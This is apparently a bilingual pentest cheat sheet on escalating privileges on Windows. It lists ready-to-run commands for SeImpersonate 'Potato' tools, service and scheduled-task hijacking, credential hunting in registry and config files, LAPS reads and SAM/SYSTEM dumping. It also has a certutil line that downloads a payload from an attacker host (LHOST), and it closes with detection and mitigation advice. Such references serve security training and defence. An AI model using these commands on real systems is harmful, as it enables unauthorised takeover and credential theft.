---
title: Windows privesc — SeImpersonate, services and credentials
tags: [windows, privesc, seimpersonate, laps, services]
---

# Windows privesc: from user to SYSTEM/Administrator

**English** | [🇪🇸 Español](privesc-windows.md)

## 1. Triage

```cmd
whoami /all
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net localgroup administrators
```

Priority order: privileges (`SeImpersonate`, `SeBackup`, `SeDebug`, `SeTakeOwnership`), stored credentials, misconfigured services, and kernel exploits last.

## 2. SeImpersonate → SYSTEM

With `SeImpersonatePrivilege` (typical of IIS/MSSQL service accounts):

```cmd
PrintSpoofer.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe"
```

The binary must match the architecture and Windows version; GodPotato covers 2019/2022 and 10/11. Upload with `certutil -urlcache -f http://<LHOST>/x.exe C:\Windows\Temp\x.exe`.

## 3. Services and tasks

```cmd
accesschk.exe -uwcqv "Everyone" * /accepteula
sc qc <service>
icacls "C:\Program Files\<app>"
```

- **Unquoted path**: `C:\Program Files\My App\svc.exe` → create `C:\Program.exe`.
- **Weak binary ACL**: replace it and restart the service (`sc stop/start`).
- **Service with a user `StartName` and password in the registry**: `reg query HKLM\SYSTEM\CurrentControlSet\Services\<svc>` (sometimes cleartext).
- **Writable scheduled tasks**: swap the script they run.

## 4. Stored credentials

```cmd
cmdkey /list
dir /a C:\Users\<user>\AppData\Roaming\Microsoft\Credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

- `runas /savecred /user:<admin> cmd` when `cmdkey` lists credentials.
- `Get-ChildItem -Recurse -Include *.xml,*.config,*.txt` for `password=`.
- **Unattend.xml**, `sysprep.inf`, `web.config`, `applicationHost.config`.

## 5. LAPS, PFX and backups

- **LAPS**: if the host uses it, the local Administrator password lives in AD; with read rights: `nxc ldap <DC> -u '<user>' -p '<pass>' --laps` or `Get-LapsADPassword` (module on the host).
- **PFX**: `certutil -importpfx` or `openssl pkcs12 -in cert.pfx -nodes`; with key and certificate you get WinRM/PKINIT.
- **SeBackupPrivilege**: `robocopy /B` over `C:\Users\Administrator\Desktop`, or copy `SAM`/`SYSTEM` for `secretsdump`.

## 6. Typical errors

- **`whoami /priv` shows the privilege as `Disabled`** → enable it (PowerShell `AdjustTokenPrivileges`, or let the Potato do it).
- **Potato fails with `Access is denied`** → no real `SeImpersonate`, or the process runs at low integrity.
- **`sc start` returns error 1053** → service misconfigured; try a reboot or the scheduled task route.
- **Cannot write to `C:\Program Files`** → look for the unquoted path in a writable directory (`C:\Temp`).
- **LAPS denied** → no `ReadLAPSPassword` on the object; review ACLs.

## 7. Detection and mitigation

- Remove `SeImpersonate` from application accounts where not essential (use virtual accounts).
- Quote every service path and lock down binary/directory ACLs.
- Rotate stored credentials; delete `cmdkey`/Unattend entries with passwords.
- LAPS everywhere, with restricted reads and access auditing.
- Alert on `*Potato*`/`PrintSpoofer` processes and on new services (7045).

MITRE: T1134.001, T1543.003, T1552.001, T1548.
